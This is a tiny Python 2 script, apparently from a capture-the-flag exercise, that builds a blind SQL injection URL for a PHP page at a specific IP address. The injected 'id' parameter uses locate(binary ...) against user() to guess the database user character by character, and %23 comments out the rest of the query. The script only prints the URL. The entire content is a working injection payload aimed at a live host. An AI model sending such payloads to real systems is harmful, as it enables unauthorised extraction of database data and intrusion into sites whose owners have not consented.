# -*- coding: utf-8 -*- 
i = "s"
j = "0"
url = "http://120.24.86.145:9004/Once_More.php?id=1'and (select locate(binary'"+str(i)+"',(select user()),"+str(j)+"))="+str(j)+"%23"
print url